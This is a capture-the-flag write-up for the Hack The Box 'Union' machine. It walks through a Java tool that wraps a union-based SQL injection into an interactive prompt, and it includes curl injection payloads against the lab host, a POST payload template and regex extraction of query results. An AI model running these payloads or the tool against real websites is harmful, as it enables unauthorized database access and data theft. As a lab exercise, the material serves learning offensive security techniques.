# Hack The Box. Machines. Union

Machine write-up: https://7rocky.github.io/en/htb/union

### `UnionSQLi.java`

This Java code is used to provide an interactive way to enter SQL queries in a form field vulnerable to Union-based SQL injection. The output will be only the result of the query if it is correct.

The SQL injection can be exploited using `curl`, but the output is the following:

```console
$ curl 10.10.11.128/index.php -d "player=' union select database() -- -"
Sorry, november you are not eligible due to already qualifying.
$ curl 10.10.11.128/index.php -d "player=' union select version() -- -"
Sorry, 8.0.27-0ubuntu0.20.04.1 you are not eligible due to already qualifying.
$ curl 10.10.11.128/index.php -d "player=' union select user() -- -"
Sorry, uhc@localhost you are not eligible due to already qualifying.
```

The aim of this Java program is to enter only the SQL query and output only the query result. An example of use of the program might be the following (`rlwrap` is a command to have a command history, to be able to move right and left, and clear the screen with `^L`):

```console
$ rlwrap java UnionSQLi.java
SQLi> select database()
november
SQLi> select version()
8.0.27-0ubuntu0.20.04.1
SQLi> select user()
uhc@localhost
SQLi> exit
```

To build the Java code, first I define some constant variables at the top:

```java
private static final String POST_URL = "http://10.10.11.128/index.php";
private static final String POST_DATA = "player=' union %s -- -";
private static final Pattern PATTERN = Pattern.compile("Sorry, ([\\s\\S]*?) you are not eligible due to already qualifying.");
```

The first one is the vulnerable URL, the second one is the payload with a `%s` to enter the SQL query using `String.format` and then the pattern to extract the result of the query using a Regular Expression.

The `main` function is the following:

```java
public static void main(String[] args) {
  try (Scanner in = new Scanner(System.in)) {
    while (true) {
      System.out.print("SQLi> ");
      String sqli = in.nextLine();

      if (sqli.equals("exit")) {
        break;
      } else if (sqli.isEmpty()) {
        continue;
      }

      String response = sendPOST(sqli);

      if (response.startsWith("Sorry")) {
        System.out.println(filterResult(response));
      } else {
        System.out.println("ERROR");
      }
    }
  } catch (IOException e) {
    System.out.println("ERROR");
  }
}
```

Basically, what it does is use an infinite loop to provide the `SQLi> ` prompt and read the SQL query from standart input (`stdin`). The SQL query is sent to the `sendPOST` method and the resulting response is filtered using `filterResult` if it is correct (otherwise it will print `ERROR`).

The `sendPOST` method is the following:

```java
  private static String sendPOST(String sqli) throws IOException {
    URL url = new URL(POST_URL);
    HttpURLConnection httpURLConnection = (HttpURLConnection) url.openConnection();
    httpURLConnection.setRequestMethod("POST");
    httpURLConnection.setDoOutput(true);

    OutputStream outputStream = httpURLConnection.getOutputStream();
    outputStream.write(String.format(POST_DATA, sqli).getBytes());
    outputStream.flush();
    outputStream.close();

    if (httpURLConnection.getResponseCode() == HttpURLConnection.HTTP_OK) {
      try (BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()))) {
        return bufferedReader.lines().map(line -> line + "\n").reduce(String::concat).orElse("");
      } catch (IOException e) {
        System.out.println("ERROR");
      }
    }

    return "";
  }
```

Although it is a little verbose, the function is very simple, it just takes the SQL query and puts it into the `POST_DATA` using `String.format` (here is the use of `%s`).

If the response is successful (200 OK), then we read the response and put it in a `String format` using some Java functional programming:

```java
bufferedReader.lines()
  .map(line -> line + "\n")
  .reduce(String::concat)
  .orElse("");
```

This sentence takes each line of the result, adds a new line character (`\n`) to each one and concatenates all of them.

The use of `.orElse("")` is because `.reduce(String::concat)` returns an `Optional<String>` type, that cannot be used as a simple `String`. This way, if some exception occurs, the returning string will be empty (`""`).

Finally, the `filterResult` method only extracts the desired data using the `PATTERN` defined above:

```java
private static String filterResult(String response) {
  Matcher matcher = PATTERN.matcher(response);
  matcher.find();
  return matcher.group(1);
}
```

The `PATTERN` makes use of `([\s\S]*?)` to match any "space" character (for instance: spaces, tabs, or new lines) with `\s` or any "non-space" character with `\S` multiple times (`*`).

The use of `?` is to match the minimum until finding the following content of the pattern (namely, ` you are not eligible due to already qualifying.`).

**Note:** The previous code snippets are shown only as an explanation, the complete source code is a bit different due to the `import` statements.
